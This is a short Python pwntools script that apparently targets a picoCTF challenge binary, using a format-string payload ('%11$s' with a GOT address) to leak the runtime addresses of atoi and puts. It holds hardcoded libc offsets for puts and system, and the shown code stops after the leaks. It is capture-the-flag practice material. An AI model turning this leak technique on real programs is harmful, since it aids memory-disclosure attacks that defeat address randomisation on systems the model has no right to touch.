from pwn import *

host = "mars.picoctf.net"
port = 31929

elf = context.binary = ELF("./chall", checksec=False)

def conn():
    if args.LOCAL:
        return process(elf.path)
    else:
        return remote(host, port)

p = conn()
puts_offset =0x805a0
system_offset =0x053110
def leak_address(got_entry: int) -> int:
    payload_a = b'1234567.' + p64(got_entry)
    payload_b = b'1.%11$s'

    p.sendlineafter(b'A: ', payload_a)
    p.sendlineafter(b'B: ', payload_b)
    p.recvuntil(b'B: 1.')

    return u64(p.recvline().strip().ljust(8, b'\0'))
def main():
    atoi_got = 0x601058
    atoi_addr = leak_address(atoi_got)
    log.success(f'Leaked atoi() address: {hex(atoi_addr)}')

    puts_got = 0x601018
    puts_addr = leak_address(puts_got)
    log.success(f'Leaked puts() address: {hex(puts_addr)}')
if __name__ == "__main__":
    main()
1
